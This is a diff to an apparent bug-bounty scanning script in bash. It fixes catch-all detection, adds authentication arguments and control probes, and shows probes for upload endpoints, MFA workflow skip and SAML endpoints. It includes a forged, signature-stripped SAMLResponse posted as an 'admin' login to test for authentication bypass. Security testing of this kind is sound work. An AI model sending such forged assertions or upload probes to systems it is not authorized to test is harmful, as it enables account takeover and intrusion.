@@ -237,26 +237,32 @@ if ! skip_has upload; then
     log_info "Check 0: Upload Surface Discovery"
     CATCHALL_HOSTS=""
     log_step "Detecting catchall behavior..."
-    head -10 "$ORDERED_SCAN" | while read -r host; do
+    # NB: no pipe into `while` here. `head ... | while read` runs the loop body in
+    # a subshell, so CATCHALL_HOSTS assignments are discarded on exit and the skip
+    # below can never fire — every probe path then reports as a hit on any host
+    # that answers 200 for unknown paths (i.e. most SPAs).
+    while read -r host; do
         [ -z "$host" ] && continue
-        if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${host}/non_existent_$(date +%s)")" -eq 200 ]; then
+        # Baseline must go through the same session as the real probes, else an
+        # authenticated run compares authed responses against an anonymous 401.
+        if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "${host}/non_existent_$(date +%s)")" -eq 200 ]; then
             log_warn "Catchall detected: $host"
             CATCHALL_HOSTS="${CATCHALL_HOSTS},${host}"
         fi
-    done
+    done < <(head -10 "$ORDERED_SCAN")
     PROBE_PATHS=("/upload.php" "/uploader.php" "/upload/index.php" "/filemanager/index.php" "/ckfinder/core/connector/php/connector.php" "/fckeditor/editor/filemanager/connectors/php/connector.php" "/elfinder.php" "/admin/upload")
-    head -30 "$ORDERED_SCAN" | while read -r host; do
+    while read -r host; do
         [ -z "$host" ] && continue
         [[ "$CATCHALL_HOSTS" == *"$host"* ]] && continue
         for path in "${PROBE_PATHS[@]}"; do
             U="${host%/}${path}"
-            if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$U")" -eq 200 ]; then
+            if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$U")" -eq 200 ]; then
                 log_vuln "Found upload path: $U"
                 echo "[INFORMATIONAL] [UPLOAD-CANDIDATE] $U" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
                 verify_upload_poc "$U"
             fi
         done
-    done
+    done < <(head -30 "$ORDERED_SCAN")
 fi
 
 # ── Check 2: SQL Injection ──────────────────────────────────────────────
@@ -452,7 +458,10 @@ if ! skip_has mfa; then
 
             # --- Test 2: MFA workflow skip (pre-MFA session to protected page) ---
             log_step "Workflow skip probe: $BASE"
-            # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session
+            # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session.
+            # INTENTIONALLY OMITS $BB_AUTH_ARGS — this test asks "is the page reachable
+            # WITHOUT auth?". Supplying the session makes it pass trivially and silently
+            # destroys the check. Do not "fix" by adding the auth array here.
             for PROTECTED in dashboard home profile account settings admin; do
                 HOST=$(echo "$url" | grep -oE "https?://[^/]+")
                 SKIP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
@@ -494,10 +503,24 @@ if ! skip_has saml; then
 
     while IFS= read -r host; do
         [ -z "$host" ] && continue
+        # Control probe first: a host that answers 200/301/302/403 for a random
+        # path tells us nothing by answering the same for /saml/*. Without this,
+        # any catch-all host (SPA, permissive proxy route) reports the whole SAML
+        # path list as discovered endpoints.
+        SAML_CONTROL=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+            ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} \
+            "${host}/saml-control-$RANDOM$$" 2>/dev/null || echo "0")
+        case "$SAML_CONTROL" in
+            200|301|302|403)
+                log_warn "[SAML] $host answers HTTP $SAML_CONTROL for random paths — skipping endpoint discovery (would be all false positives)"
+                continue
+                ;;
+        esac
         for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
                          "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
                          "/.well-known/openid-configuration"; do
             CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} \
                 "${host}${SAML_PATH}" 2>/dev/null || echo "0")
             case "$CODE" in
                 200|301|302|403)
@@ -511,7 +534,7 @@ if ! skip_has saml; then
     # Metadata exposure check (reveals IdP certs, entity IDs — aids XSW)
     while IFS= read -r url; do
         [ -z "$url" ] && continue
-        RESP=$(curl -sk --max-time 8 "$url" 2>/dev/null || true)
+        RESP=$(curl -sk --max-time 8 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$url" 2>/dev/null || true)
         if echo "$RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
             log_vuln "[SAML] Metadata exposed (aids XSW/cert extraction): $url"
             echo "[INFORMATIONAL] [SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
@@ -524,7 +547,10 @@ if ! skip_has saml; then
     ACS_URL=$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | grep "saml/acs\|saml/login" | head -1 | awk '{print $2}' || true)
     if [ -n "$ACS_URL" ]; then
         if unsafe_method_guard "POST" "$ACS_URL" "SAML signature-stripping probe"; then
-            # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
+            # Minimal stripped SAMLResponse (no Signature element, NameID = admin).
+            # INTENTIONALLY OMITS $BB_AUTH_ARGS — this forges a login. Replaying it
+            # with an already-valid session returns 200/302 regardless, turning every
+            # authenticated run into a false CRITICAL. Do not "fix" by adding auth.
             STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
             CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
                 -X POST "$ACS_URL" \
